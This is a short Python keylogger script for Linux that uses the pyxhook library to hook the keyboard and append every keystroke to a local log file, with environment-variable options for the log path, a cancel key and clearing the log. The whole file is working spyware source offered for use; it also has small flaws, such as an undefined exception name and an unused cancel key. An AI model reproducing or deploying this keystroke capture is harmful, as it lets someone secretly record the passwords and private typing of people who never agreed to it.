# To be used in Linux
#!/usr/bin/env python

import os
import pyxhook 

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log

log_file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('/home/mrrobot/Documents/python_keylogger_for_linux/file.log')
)


# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
	os.environ.get(
		'pylogger_cannel',
		'`'
	)[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
	try:
		os.remove(log_file)
	except EnvironmentError:
		# File does not exist, or no permissons.
		pass


#Creating key pressing event and saving it into log file 
def OnKeyPress(event):
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(event.Key))

# Create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

#Set the Hook
new_hook.HookKeyboard()
try:
	new_hook.start()                     # Start the hook
except HookKeyboardInterrupt:
	#User Cancelled from command line 
	pass

except Exception as ex:
	# Write excetions to the log file, for analysis later.
	msg = 'Error while cathing event:\n {}'.format(ex)
	pyxhook.print_err(msg)
	with open(log_file, 'a') as f:
		f.write('\n{}'.format(msg))

       


         

